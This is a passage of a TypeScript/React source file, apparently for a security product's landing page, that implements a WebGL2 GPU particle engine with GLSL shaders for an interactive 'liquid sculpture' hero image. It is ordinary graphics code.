import React, { useState, useEffect, useRef, useMemo, useCallback } from "react";
import {
  Shield,
  ShieldAlert,
  ShieldCheck,
  Lock,
  Activity,
  Terminal,
  Server,
  Globe,
  Cpu,
  AlertTriangle,
  CheckCircle2,
  XCircle,
  Search,
  Sliders,
  Copy,
  Check,
  RefreshCw,
  Zap,
  Eye,
  FileCode,
  ArrowRight,
  ChevronRight,
  Layers,
  Key,
  Radio,
  Sparkles,
  Filter,
  Download,
  X
} from "lucide-react";
import {
  ResponsiveContainer,
  AreaChart,
  Area,
  XAxis,
  YAxis,
  Tooltip,
  CartesianGrid
} from "recharts";

/* ────────────────────────────────────────────────────────────────────
   Engine (WebGL2 GPGPU particles) — Liquid Sculpture Hero
   Adapted for AegisSec® Autonomous Web & API Security Platform
   ──────────────────────────────────────────────────────────────────── */

type Rect = { x: number; y: number; w: number; h: number };

interface EngineOptions {
  interactive: boolean;
  strength: number;
  radius: number;
  density: number;
  dotSize: number;
  spread: number;
  turbulence: number;
  returnSpeed: number;
  streaks: boolean;
  restStyle: "image" | "particles";
  ambient: boolean;
  ambientIntensity: number;
  speed: number;
  intro: boolean;
  reducedMotion: boolean;
  bg: [number, number, number];
  imgBg: [number, number, number] | null;
  liquid: number;
}

function clamp(v: number, a: number, b: number) {
  return Math.min(b, Math.max(a, v));
}

function hexToRgb(hex: string, fallback: [number, number, number]): [number, number, number] {
  if (typeof hex !== "string") return fallback;
  const s = hex.trim();
  let m = s.match(/^#?([0-9a-f]{3})$/i);
  if (m) {
    const [r, g, b] = m[1].split("").map((c) => parseInt(c + c, 16) / 255);
    return [r, g, b];
  }
  m = s.match(/^#?([0-9a-f]{6})([0-9a-f]{2})?$/i);
  if (m) {
    const n = parseInt(m[1], 16);
    return [((n >> 16) & 255) / 255, ((n >> 8) & 255) / 255, (n & 255) / 255];
  }
  m = s.match(/^rgba?\(\s*([\d.]+)[,\s]+([\d.]+)[,\s]+([\d.]+)/i);
  if (m) return [+m[1] / 255, +m[2] / 255, +m[3] / 255];
  return fallback;
}

const NOISE = `
float hash(vec2 p){ p = fract(p*vec2(123.34,456.21)); p += dot(p,p+45.32); return fract(p.x*p.y); }
float vnoise(vec2 p){ vec2 i=floor(p); vec2 f=fract(p); vec2 u=f*f*f*(f*(f*6.0-15.0)+10.0);
  return mix(mix(hash(i),hash(i+vec2(1.0,0.0)),u.x), mix(hash(i+vec2(0.0,1.0)),hash(i+vec2(1.0,1.0)),u.x), u.y); }
vec2 ambientField(vec2 uv, float t){
  vec2 q = uv*vec2(3.2,1.7);
  vec2 a = vec2(vnoise(q+vec2(t*0.11,0.0))-0.5, vnoise(q+vec2(5.2,t*0.08)+3.1)-0.5);
  vec2 q2 = uv*vec2(7.5,4.0) + vec2(-t*0.19, t*0.13);
  vec2 b = vec2(vnoise(q2+1.7)-0.5, vnoise(q2+9.3)-0.5);
  return a + b*0.45;
}
`;

const ENERGY = `
float energyAt(vec2 rectPx, vec2 mouse, float radius, float presence, float wakeEnergy){
  vec2 d = rectPx - mouse;
  float f = exp(-dot(d,d)/(radius*radius))*presence;
  return smoothstep(0.06, 0.5, f*1.15 + wakeEnergy*1.7);
}
`;

const QUAD_VS = `#version 300 es
layout(location=0) in vec2 aPos;
out vec2 vUv;
void main(){ vUv = aPos*0.5+0.5; gl_Position = vec4(aPos,0.0,1.0); }
`;

const FLOW_FS = `#version 300 es
precision highp float;
in vec2 vUv;
out vec4 o;
uniform sampler2D uPrev;
uniform vec2 uTexel;
uniform vec2 uMouse;
uniform vec2 uVel;
uniform vec2 uSize;
uniform float uRadius;
uniform float uPresence;
uniform float uDecay;
vec2 decV(vec4 c){ return (c.rg*255.0-128.0)/127.0; }
void main(){
  vec2 v0 = decV(texture(uPrev, vUv));
  vec2 uv = vUv - v0*uTexel*2.5;
  vec4 c = texture(uPrev, uv)*0.52
    + 0.12*(texture(uPrev, uv+vec2(uTexel.x,0.0)) + texture(uPrev, uv-vec2(uTexel.x,0.0))
          + texture(uPrev, uv+vec2(0.0,uTexel.y)) + texture(uPrev, uv-vec2(0.0,uTexel.y)));
  vec2 v = decV(c);
  float p = c.b;
  vec2 d = (vUv-uMouse)*uSize;
  float f = exp(-dot(d,d)/(uRadius*uRadius))*uPresence;
  float sp = clamp(length(uVel)*2.5, 0.0, 1.0);
  v += uVel*f*0.22;
  p = max(p, f*sp);
  v *= uDecay;
  p *= uDecay;
  v = sign(v)*max(abs(v)-1.2/127.0, 0.0);
  p = max(p-1.2/255.0, 0.0);
  v = clamp(v, -1.0, 1.0);
  o = vec4((v*127.0+128.0)/255.0, p, 1.0);
}
`;

const SIM_FS = `#version 300 es
precision highp float;
out vec4 o;
uniform sampler2D uState;
uniform sampler2D uHome;
uniform sampler2D uFlow;
uniform vec2 uSize;
uniform vec2 uMouse;
uniform float uRadius;
uniform float uPresence;
uniform float uStrength;
uniform float uSpread;
uniform float uTurb;
uniform float uReturn;
uniform float uTime;
uniform float uDt;
uniform float uIntro;
${NOISE}
vec2 curl(vec2 p){
  const float e = 0.35;
  float a = vnoise(p+vec2(0.0,e)) - vnoise(p-vec2(0.0,e));
  float b = vnoise(p+vec2(e,0.0)) - vnoise(p-vec2(e,0.0));
  return vec2(a, -b)/(2.0*e);
}
void main(){
  ivec2 ij = ivec2(gl_FragCoord.xy);
  vec4 hm = texelFetch(uHome, ij, 0);
  if(hm.w <= 0.0){ o = vec4(0.0); return; }
  vec4 st = texelFetch(uState, ij, 0);
  vec2 off = st.xy;
  vec2 vel = st.zw;
  float sd = hm.z;
  float light = 0.45 + sd*1.1;

  vec2 p = hm.xy*uSize + off;
  vec4 fl = texture(uFlow, clamp(p/uSize, 0.0, 1.0));
  vec2 wake = (fl.rg*255.0-128.0)/127.0;
  float pr = fl.b;

  vec2 toM = p - uMouse;
  float r2 = dot(toM,toM);
  float f = exp(-r2/(uRadius*uRadius))*uPresence;
  vec2 n = toM*inversesqrt(r2+1.0);
  float e = clamp(pr*2.0 + f, 0.0, 1.0);

  vec2 acc = vec2(0.0);
  acc += n*f*1.25*uStrength*uSpread*light;
  acc += vec2(-n.y, n.x)*f*1.45*uStrength*uSpread*(0.4+sd);
  acc += (wake*42.0*uSpread*light - vel)*e*0.08;
  vec2 q = p*0.0095 + vec2(uTime*0.35, -uTime*0.2);
  vec2 c = curl(q) + 0.5*curl(q*2.3 + 7.1);
  acc += c*(e*1.2*uSpread + uIntro*1.5)*uTurb*light;
  float k = (0.006 + 0.02*uReturn)*(0.65+sd*0.7)*(1.0 - uIntro*0.75);
  acc -= off*k;

  vel += acc*uDt;
  vel *= pow(mix(0.93, 0.955, e), uDt);
  off += vel*uDt;
  if(dot(off,off) < 0.0004 && dot(vel,vel) < 0.0004){ off = vec2(0.0); vel = vec2(0.0); }
  o = vec4(off, vel);
}
`;

const PART_VS = `#version 300 es
precision highp float;
layout(location=0) in vec2 aCorner;
uniform sampler2D uState;
uniform sampler2D uHome;
uniform sampler2D uCol;
uniform sampler2D uFlow;
uniform int uTexW;
uniform vec4 uRect;
uniform vec2 uRes;
uniform vec2 uMouse;
uniform float uRadius;
uniform float uPresence;
uniform float uDot;
uniform float uTime;
uniform float uAmbient;
uniform float uStreak;
uniform float uIntroVis;
uniform float uRest;
uniform vec3 uTint;
out vec2 vLocal;
out float vHalfLen;
out float vR;
out vec3 vCol;
out float vA;
${NOISE}
${ENERGY}
void main(){
  int id = gl_InstanceID;
  ivec2 ij = ivec2(id % uTexW, id / uTexW);
  vec4 hm = texelFetch(uHome, ij, 0);
  vec4 st = texelFetch(uState, ij, 0);
  vec4 cl = texelFetch(uCol, ij, 0);

  float wakeE = texture(uFlow, hm.xy).b;
  float E = energyAt(hm.xy*uRect.zw, uMouse, uRadius, uPresence, wakeE);
  float lift = smoothstep(0.35, 2.5, length(st.xy));
  float a = max(max(E, lift), max(uRest, 1.0-uIntroVis));
  if(a < 0.01 || hm.w <= 0.0){ gl_Position = vec4(2.0,2.0,2.0,1.0); return; }

  vec2 base = uRect.xy + hm.xy*uRect.zw + st.xy;
  base -= ambientField(hm.xy, uTime)*10.0*uAmbient;

  vec2 v = st.zw;
  float sp = length(v);
  vec2 dir = sp > 0.001 ? v/sp : vec2(1.0,0.0);
  float r = uDot*hm.w*0.5;
  float len = min(sp*1.25, 18.0)*uStreak;
  vec2 lc = aCorner*vec2(r + len*0.5 + 1.0, r + 1.0);
  vec2 center = base - dir*len*0.5;
  vec2 world = center + dir*lc.x + vec2(-dir.y, dir.x)*lc.y;

  vec2 clip = world/uRes*2.0-1.0;
  gl_Position = vec4(clip.x, -clip.y, 0.0, 1.0);
  vLocal = lc;
  vHalfLen = len*0.5;
  vR = r;
  vec3 col = cl.rgb*uTint;
  float glint = smoothstep(2.0, 16.0, sp);
  col = mix(col, min(col*1.18 + vec3(0.07,0.075,0.085), vec3(1.0)), glint*0.75);
  vCol = col;
  vA = a;
}
`;

const PART_FS = `#version 300 es
precision highp float;
in vec2 vLocal;
in float vHalfLen;
in float vR;
in vec3 vCol;
in float vA;
uniform float uDpr;
out vec4 o;
void main(){
  vec2 q = vec2(max(abs(vLocal.x)-vHalfLen, 0.0), vLocal.y);
  float d = length(q) - vR;
  float a = clamp(0.5 - d*uDpr, 0.0, 1.0);
  float tail = vHalfLen > 0.0 ? clamp(0.5 - vLocal.x/(2.0*(vHalfLen+vR)), 0.0, 1.0) : 0.0;
  a *= 1.0 - tail*0.55;
  a *= vA;
  if(a < 0.004) discard;
  o = vec4(vCol*a, a);
}
`;

const IMAGE_FS = `#version 300 es
precision highp float;
out vec4 o;
uniform sampler2D uImg;
uniform sampler2D uFlow;
uniform vec2 uRes;
uniform float uDpr;
uniform vec4 uRect;
uniform vec3 uBg;
uniform vec3 uImgBg;
uniform vec2 uMouse;
uniform float uPresence;
uniform float uRadius;
uniform float uStrength;
uniform float uTime;
uniform float uAmbient;
uniform float uIntroVis;
uniform float uRest;
uniform float uAlphaMode;
${NOISE}
${ENERGY}
void main(){
  vec2 px = vec2(gl_FragCoord.x, uRes.y*uDpr - gl_FragCoord.y)/uDpr;
  vec2 size = uRect.zw;
  vec2 uv = (px-uRect.xy)/size;
  if(uv.x < -0.05 || uv.x > 1.05 || uv.y < -0.12 || uv.y > 1.12){ o = vec4(0.0); return; }
  vec4 fl = texture(uFlow, clamp(uv,0.0,1.0));
  vec2 vel = (fl.rg*255.0-128.0)/127.0;
  vec2 rp = uv*size;
  vec2 toM = rp - uMouse;
  float fall = exp(-dot(toM,toM)/(uRadius*uRadius))*uPresence;
  vec2 disp = -toM*0.22*uStrength*fall - vel*10.0*uStrength;
  disp += ambientField(uv, uTime)*10.0*uAmbient;
  vec2 suv = uv + disp/size;
  vec4 tx = texture(uImg, suv);
  vec3 col = tx.rgb;
  vec2 e = smoothstep(vec2(0.0), vec2(0.004,0.01), suv) * smoothstep(vec2(1.0), vec2(0.996,0.99), suv);
  float key = uAlphaMode > 0.5 ? tx.a : smoothstep(0.012, 0.05, length(col-uImgBg));
  float k = key*e.x*e.y;
  float E = energyAt(rp, uMouse, uRadius, uPresence, fl.b);
  float show = (1.0 - max(E, uRest))*uIntroVis;
  vec3 mat = uAlphaMode > 0.5 ? col : col*(uBg/max(uImgBg, vec3(0.001)));
  float A = k*show;
  o = vec4(mat*A, A);
}
`;

type Prog = { p: WebGLProgram; u: Record<string, WebGLUniformLocation | null> };

function compile(gl: WebGL2RenderingContext, vs: string, fs: string): Prog {
  const make = (type: number, src: string) => {
    const sh = gl.createShader(type)!;
    gl.shaderSource(sh, src);
    gl.compileShader(sh);
    if (!gl.getShaderParameter(sh, gl.COMPILE_STATUS)) {
      const log = gl.getShaderInfoLog(sh);
      gl.deleteShader(sh);
      throw new Error("Shader: " + log);
    }
    return sh;
  };
  const p = gl.createProgram()!;
  const v = make(gl.VERTEX_SHADER, vs);
  const f = make(gl.FRAGMENT_SHADER, fs);
  gl.attachShader(p, v);
  gl.attachShader(p, f);
  gl.bindAttribLocation(p, 0, "aPos");
  gl.linkProgram(p);
  gl.deleteShader(v);
  gl.deleteShader(f);
  if (!gl.getProgramParameter(p, gl.LINK_STATUS)) throw new Error("Link: " + gl.getProgramInfoLog(p));
  const u: Record<string, WebGLUniformLocation | null> = {};
  const n = gl.getProgramParameter(p, gl.ACTIVE_UNIFORMS);
  for (let i = 0; i < n; i++) {
    const info = gl.getActiveUniform(p, i);
    if (info) u[info.name] = gl.getUniformLocation(p, info.name);
  }
  return { p, u };
}

const TEX_W = 1024;
const SETTLE_FRAMES = 270;

class LiquidEngine {
  lastImage: HTMLImageElement | null = null;
  onFirstFrame: (() => void) | null = null;

  private canvas: HTMLCanvasElement;
  private gl: WebGL2RenderingContext;
  private opts: EngineOptions;
  private onFail: () => void;
  private lowPower = false;
  private stateFormat: { internal: number; type: number } = { internal: 0, type: 0 };

  private pFlow!: Prog;
  private pSim!: Prog;
  private pPart!: Prog;
  private pImg!: Prog;
  private vao!: WebGLVertexArrayObject;
  private quad!: WebGLBuffer;

  private imgTex: WebGLTexture | null = null;
  private flowTex: WebGLTexture[] = [];
  private flowFb: WebGLFramebuffer[] = [];
  private flowW = 256;
  private flowH = 104;
  private flowIdx = 0;
  private flowDirty = false;

  private homeTex: WebGLTexture | null = null;
  private colTex: WebGLTexture | null = null;
  private stateTex: WebGLTexture[] = [];
  private stateFb: WebGLFramebuffer[] = [];
  private stateIdx = 0;
  private texH = 1;
  private n = 0;
  private gridW = 1;
  private stateDirty = false;
  private alphaMode = false;
  private imgBg: [number, number, number] = [0.016, 0.035, 0.059];
  private flowing = 0;

  private aspect = 1.777;
  private rect: Rect = { x: 0, y: 0, w: 1, h: 1 };
  private cssW = 1;
  private cssH = 1;

  private target = { x: -9999, y: -9999 };
  private mouse = { x: -9999, y: -9999 };
  private prevMouse = { x: -9999, y: -9999 };
  private mvel = { x: 0, y: 0 };
  private presence = 0;
  private presenceTarget = 0;
  private burst = 0;
  private lastInput = -1e9;
  private settle = 1e9;
  private touchRelease = 0;

  private time = 0;
  private introT = 1;
  private raf = 0;
  private running = false;
  private last = 0;
  private skip = 0;
  private visible = true;
  private ready = false;
  private destroyed = false;
  private lost = false;
  private homeData: Float32Array | null = null;

  constructor(canvas: HTMLCanvasElement, opts: EngineOptions, onFail: () => void) {
    this.canvas = canvas;
    this.opts = opts;
    this.onFail = onFail;
    const gl = canvas.getContext("webgl2", {
      alpha: true,
      antialias: false,
      depth: false,
      stencil: false,
      premultipliedAlpha: true,
      preserveDrawingBuffer: false,
      powerPreference: "high-performance",
    }) as WebGL2RenderingContext | null;
    if (!gl) throw new Error("WebGL2 unavailable");
    this.gl = gl;
    const nav = navigator as Navigator & { deviceMemory?: number };
    this.lowPower =
      (nav.hardwareConcurrency || 8) <= 4 ||
      (nav.deviceMemory || 8) <= 4 ||
      window.matchMedia("(pointer: coarse)").matches;
    this.initGL();
    canvas.addEventListener("webglcontextlost", this.onLost, false);
  }

  private onLost = (e: Event) => {
    e.preventDefault();
    this.lost = true;
    this.stop();
    this.onFail();
  };

  private initGL() {
    const gl = this.gl;
    const full = gl.getExtension("EXT_color_buffer_float");
    const half = full ? null : gl.getExtension("EXT_color_buffer_half_float");
    if (!full && !half) throw new Error("No float render targets");
    this.stateFormat = { internal: gl.RGBA16F, type: gl.HALF_FLOAT };

    this.pFlow = compile(gl, QUAD_VS, FLOW_FS);
    this.pSim = compile(gl, QUAD_VS, SIM_FS);
    this.pPart = compile(gl, PART_VS, PART_FS);
    this.pImg = compile(gl, QUAD_VS, IMAGE_FS);

    this.vao = gl.createVertexArray()!;
    gl.bindVertexArray(this.vao);
    this.quad = gl.createBuffer()!;
    gl.bindBuffer(gl.ARRAY_BUFFER, this.quad);
    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]), gl.STATIC_DRAW);
    gl.enableVertexAttribArray(0);
    gl.vertexAttribPointer(0, 2, gl.FLOAT, false, 0, 0);

    for (let i = 0; i < 2; i++) {
      const t = this.makeTex(gl.RGBA8, this.flowW, this.flowH, gl.RGBA, gl.UNSIGNED_BYTE, null, gl.LINEAR);
      const fb = gl.createFramebuffer()!;
      gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
      gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, t, 0);
      this.flowTex.push(t);
      this.flowFb.push(fb);
    }
    this.clearFlow();
  }

  private makeTex(
    internal: number,
    w: number,
    h: number,
    format: number,
    type: number,
    data: ArrayBufferView | null,
    filter: number
  ) {
    const gl = this.gl;
    const t = gl.createTexture()!;
    gl.bindTexture(gl.TEXTURE_2D, t);
    gl.pixelStorei(gl.UNPACK_ALIGNMENT, 1);
    gl.texImage2D(gl.TEXTURE_2D, 0, internal, w, h, 0, format, type, data);
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, filter);
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, filter);
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
    return t;
  }

  private clearFlow() {
    const gl = this.gl;
    for (const fb of this.flowFb) {
      gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
      gl.viewport(0, 0, this.flowW, this.flowH);
      gl.clearColor(128 / 255, 128 / 255, 0, 1);
      gl.clear(gl.COLOR_BUFFER_BIT);
    }
    gl.bindFramebuffer(gl.FRAMEBUFFER, null);
    this.flowDirty = false;
  }

  private clearState() {
    const gl = this.gl;
    for (const fb of this.stateFb) {
      gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
      gl.viewport(0, 0, TEX_W, this.texH);
      gl.clearColor(0, 0, 0, 0);
      gl.clear(gl.COLOR_BUFFER_BIT);
    }
    gl.bindFramebuffer(gl.FRAMEBUFFER, null);
    this.stateDirty = false;
  }

  setImage(img: HTMLImageElement) {
    if (this.destroyed || this.lost) return;
    const gl = this.gl;
    this.lastImage = img;
    this.aspect = img.naturalWidth / img.naturalHeight || 1.777;
    this.flowH = Math.max(32, Math.round(this.flowW / this.aspect));
    for (const t of this.flowTex) {
      gl.bindTexture(gl.TEXTURE_2D, t);
      gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA8, this.flowW, this.flowH, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
    }
    this.clearFlow();
    if (this.imgTex) gl.deleteTexture(this.imgTex);
    this.imgTex = gl.createTexture();
    gl.bindTexture(gl.TEXTURE_2D, this.imgTex);
    gl.pixelStorei(gl.UNPACK_FLIP_Y_WEBGL, false);
    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, img);
    gl.generateMipmap(gl.TEXTURE_2D);
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR_MIPMAP_LINEAR);
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.LINEAR);
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
    this.buildParticles(img);
    this.ready = true;
    if (this.opts.intro && !this.opts.reducedMotion) this.startIntro();
    this.wake();
  }

  private buildParticles(img: HTMLImageElement) {
    const gl = this.gl;
    const baseGrid = this.lowPower ? 640 : 1000;
    const gw = Math.round(baseGrid * Math.sqrt(clamp(this.opts.density, 0.15, 2)));
    const gh = Math.max(1, Math.round(gw / this.aspect));
    this.gridW = gw;
    let data: Uint8ClampedArray;
    try {
      const c = document.createElement("canvas");
      c.width = gw;
      c.height = gh;
      const ctx = c.getContext("2d", { willReadFrequently: true })!;
      ctx.imageSmoothingQuality = "high";
      ctx.drawImage(img, 0, 0, gw, gh);
      data = ctx.getImageData(0, 0, gw, gh).data;
    } catch {
      throw new Error("Image is not CORS-readable");
    }
    let transparent = 0;
    for (let i = 3; i < data.length; i += 4 * 7) if (data[i] < 250) transparent++;
    this.alphaMode = transparent > data.length / (4 * 7) / 20;
    if (this.opts.imgBg) this.imgBg = this.opts.imgBg;
    else if (!this.alphaMode) {
      let r = 0, g = 0, b = 0, n = 0;
      const pw = Math.max(2, Math.round(gw * 0.012));
      for (const [cx, cy] of [[0, 0], [gw - pw, 0], [0, gh - pw], [gw - pw, gh - pw]]) {
        for (let y = cy; y < cy + pw; y++)
          for (let x = cx; x < cx + pw; x++) {
            const i = (y * gw + x) * 4;
            r += data[i]; g += data[i + 1]; b += data[i + 2]; n++;
          }
      }
      this.imgBg = [r / n / 255, g / n / 255, b / n / 255];
    }
    const home: number[] = [];
    const col: number[] = [];
    for (let y = 0; y < gh; y++) {
      for (let x = 0; x < gw; x++) {
        const i = (y * gw + x) * 4;
        const r = data[i] / 255;
        const g = data[i + 1] / 255;
        const b = data[i + 2] / 255;
        if (this.alphaMode) {
          const a = data[i + 3] / 255;
          if (a < 0.12) continue;
          if (a < 0.5 && Math.random() > a * 2) continue;
        } else {
          const dev = Math.hypot(r - this.imgBg[0], g - this.imgBg[1], b - this.imgBg[2]);
          if (dev < 0.03) continue;
          if (dev < 0.07 && Math.random() > (dev - 0.03) / 0.04) continue;
        }
        const jx = (Math.random() - 0.5) * 0.6;
        const jy = (Math.random() - 0.5) * 0.6;
        home.push((x + 0.5 + jx) / gw, (y + 0.5 + jy) / gh, Math.random(), 0.85 + Math.random() * 0.3);
        col.push(data[i], data[i + 1], data[i + 2], 255);
      }
    }
    const n = home.length / 4;
    this.n = n;
    this.texH = Math.max(1, Math.ceil(n / TEX_W));
    const total = TEX_W * this.texH;
    const homeArr = new Float32Array(total * 4);
    homeArr.set(home);
    const colArr = new Uint8Array(total * 4);
    colArr.set(col);

    for (const t of [this.homeTex, this.colTex, ...this.stateTex]) if (t) gl.deleteTexture(t);
    for (const f of this.stateFb) gl.deleteFramebuffer(f);
    this.stateTex = [];
    this.stateFb = [];
    this.homeTex = this.makeTex(gl.RGBA32F, TEX_W, this.texH, gl.RGBA, gl.FLOAT, homeArr, gl.NEAREST);
    this.colTex = this.makeTex(gl.RGBA8, TEX_W, this.texH, gl.RGBA, gl.UNSIGNED_BYTE, colArr, gl.NEAREST);
    for (let i = 0; i < 2; i++) {
      const t = this.makeTex(this.stateFormat.internal, TEX_W, this.texH, gl.RGBA, this.stateFormat.type, null, gl.NEAREST);
      const fb = gl.createFramebuffer()!;
      gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
      gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, t, 0);
      if (gl.checkFramebufferStatus(gl.FRAMEBUFFER) !== gl.FRAMEBUFFER_COMPLETE) throw new Error("Float FBO incomplete");
      this.stateTex.push(t);
      this.stateFb.push(fb);
    }
    gl.bindFramebuffer(gl.FRAMEBUFFER, null);
    this.homeData = homeArr;
    this.clearState();
  }

  private startIntro() {
    const gl = this.gl;
    const home = this.homeData;
    if (!home) return;
    const w = this.rect.w > 10 ? this.rect.w : 1300;
    const total = TEX_W * this.texH;
    const st = new Float32Array(total * 4);
    for (let i = 0; i < this.n; i++) {
      const hx = home[i * 4] - 0.5;
      const hy = home[i * 4 + 1] - 0.5;
      const sd = home[i * 4 + 2];
      const ang = (Math.random() - 0.5) * 0.9 + (hx > 0 ? 0 : Math.PI);
      const dist = w * (0.04 + Math.random() * 0.14) * (0.5 + Math.abs(hx) * 1.4);
      st[i * 4] = Math.cos(ang) * dist + hx * w * 0.25 * sd;
      st[i * 4 + 1] = Math.sin(ang) * dist * 0.55 + hy * 120 * (Math.random() - 0.5);
    }
    gl.bindTexture(gl.TEXTURE_2D, this.stateTex[this.stateIdx]);
    gl.texImage2D(gl.TEXTURE_2D, 0, this.stateFormat.internal, TEX_W, this.texH, 0, gl.RGBA, gl.FLOAT, st);
    this.introT = 0;
    this.stateDirty = true;
  }

  setOptions(o: Partial<EngineOptions>) {
    const rebuild =
      (o.density !== undefined && o.density !== this.opts.density) ||
      (o.imgBg !== undefined && String(o.imgBg) !== String(this.opts.imgBg));
    this.opts = { ...this.opts, ...o };
    if (rebuild && this.ready && this.lastImage) {
      try {
        this.buildParticles(this.lastImage);
      } catch {
        this.onFail();
      }
    }
    this.wake();
  }

  resize(cssW: number, cssH: number, rect: Rect) {
    this.cssW = Math.max(1, cssW);
    this.cssH = Math.max(1, cssH);
    this.rect = rect;
    let dpr = Math.min(window.devicePixelRatio || 1, this.lowPower ? 1.5 : 2);
    const px = this.cssW * this.cssH * dpr * dpr;
    if (px > 4.5e6) dpr = Math.max(1, Math.sqrt(4.5e6 / (this.cssW * this.cssH)));
    const w = Math.round(this.cssW * dpr);
    const h = Math.round(this.cssH * dpr);
    if (this.canvas.width !== w || this.canvas.height !== h) {
      this.canvas.width = w;
      this.canvas.height = h;
    }
    this.draw();
  }

  setVisible(v: boolean) {
    this.visible = v;
    if (v) this.wake();
    else this.stop();
  }

  pointer(type: "move" | "down" | "up" | "leave", x: number, y: number, touch: boolean) {
    if (!this.opts.interactive || this.lost) return;
    const now = performance.now();
    if (type === "leave" || type === "up") {
      if (touch) this.touchRelease = now + 260;
      else this.presenceTarget = 0;
      this.wake();
      return;
    }
    if (this.mouse.x < -9000 || type === "down") {
      this.mouse.x = this.prevMouse.x = x;
      this.mouse.y = this.prevMouse.y = y;
    }
    this.target.x = x;
    this.target.y = y;
    this.presenceTarget = 1;
    this.lastInput = now;
    this.settle = 0;
    if (type === "down") {
      this.burst = 1;
      this.touchRelease = 0;
    }
    this.wake();
  }

  private wake() {
    if (!this.ready || this.running || !this.visible || this.destroyed || this.lost) {
      if (this.ready && !this.running) this.draw();
      return;
    }
    this.running = true;
    this.last = performance.now();
    this.raf = requestAnimationFrame(this.frame);
  }

  private stop() {
    this.running = false;
    cancelAnimationFrame(this.raf);
  }

  private radiusPx() {
    return this.opts.radius * clamp(this.rect.w / 1400, 0.6, 1.25);
  }

  private strength() {
    return this.opts.strength * (this.opts.reducedMotion ? 0.5 : 1);
  }

  private frame = (now: number) => {
    if (!this.running) return;
    const rawMs = now - this.last;
    const dt = clamp(rawMs / 16.6667, 0.25, 3);
    this.last = now;
    const o = this.opts;
    const ambientOn = o.ambient && !o.reducedMotion;

    if (this.touchRelease && now > this.touchRelease) {
      this.presenceTarget = 0;
      this.touchRelease = 0;
    }
    const ease = 1 - Math.pow(1 - 0.22, dt);
    this.mouse.x += (this.target.x - this.mouse.x) * ease;
    this.mouse.y += (this.target.y - this.mouse.y) * ease;
    const vx = (this.mouse.x - this.prevMouse.x) / dt;
    const vy = (this.mouse.y - this.prevMouse.y) / dt;
    this.prevMouse.x = this.mouse.x;
    this.prevMouse.y = this.mouse.y;
    this.mvel.x += (clamp(vx, -60, 60) - this.mvel.x) * 0.5;
    this.mvel.y += (clamp(vy, -60, 60) - this.mvel.y) * 0.5;
    const pk = this.presenceTarget > this.presence ? 0.1 : 0.035;
    this.presence += (this.presenceTarget - this.presence) * (1 - Math.pow(1 - pk, dt));
    if (this.presence < 0.001 && this.presenceTarget === 0) this.presence = 0;
    const fk = this.presenceTarget > this.flowing ? 0.05 : 0.018;
    this.flowing += (this.presenceTarget - this.flowing) * (1 - Math.pow(1 - fk, dt));
    if (this.flowing < 0.002 && this.presenceTarget === 0) this.flowing = 0;
    if (this.introT < 1) this.introT = Math.min(1, this.introT + Math.min(rawMs, 100) / 3200);

    const interacting = this.presence > 0.001 || this.burst > 0;
    this.settle = interacting ? 0 : this.settle + dt;
    const active = interacting || this.settle < SETTLE_FRAMES || this.introT < 1;

    if (!active) {
      if (this.flowDirty) this.clearFlow();
      if (this.stateDirty) this.clearState();
      if (!ambientOn) {
        this.draw();
        this.firstFrame();
        this.stop();
        return;
      }
      this.raf = requestAnimationFrame(this.frame);
      if (this.skip++ % 2) return;
      this.time += (dt * 2 * o.speed) / 60;
      this.draw();
      this.firstFrame();
      return;
    }
    this.raf = requestAnimationFrame(this.frame);
    this.time += (dt * o.speed * (1 + this.flowing * 1.6)) / 60;
    this.stepFlow(dt);
    this.stepSim(dt);
    this.burst = Math.max(0, this.burst - 0.1 * dt);
    this.draw();
    this.firstFrame();
  };

  private firstFrame() {
    if (this.onFirstFrame) {
      const cb = this.onFirstFrame;
      this.onFirstFrame = null;
      requestAnimationFrame(() => cb());
    }
  }

  private stepFlow(dt: number) {
    const gl = this.gl;
    const P = this.pFlow;
    const dst = 1 - this.flowIdx;
    gl.bindFramebuffer(gl.FRAMEBUFFER, this.flowFb[dst]);
    gl.viewport(0, 0, this.flowW, this.flowH);
    gl.disable(gl.BLEND);
    gl.useProgram(P.p);
    gl.bindVertexArray(this.vao);
    gl.activeTexture(gl.TEXTURE0);
    gl.bindTexture(gl.TEXTURE_2D, this.flowTex[this.flowIdx]);
    gl.uniform1i(P.u.uPrev, 0);
    gl.uniform2f(P.u.uTexel, 1 / this.flowW, 1 / this.flowH);
    const r = this.rect;
    gl.uniform2f(P.u.uMouse, (this.mouse.x - r.x) / r.w, (this.mouse.y - r.y) / r.h);
    gl.uniform2f(P.u.uVel, clamp(this.mvel.x / 40, -1, 1), clamp(this.mvel.y / 40, -1, 1));
    gl.uniform2f(P.u.uSize, r.w, r.h);
    gl.uniform1f(P.u.uRadius, this.radiusPx());
    gl.uniform1f(P.u.uPresence, Math.max(this.presence, this.burst));
    gl.uniform1f(P.u.uDecay, Math.pow(0.968, dt));
    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
    this.flowIdx = dst;
    this.flowDirty = true;
  }

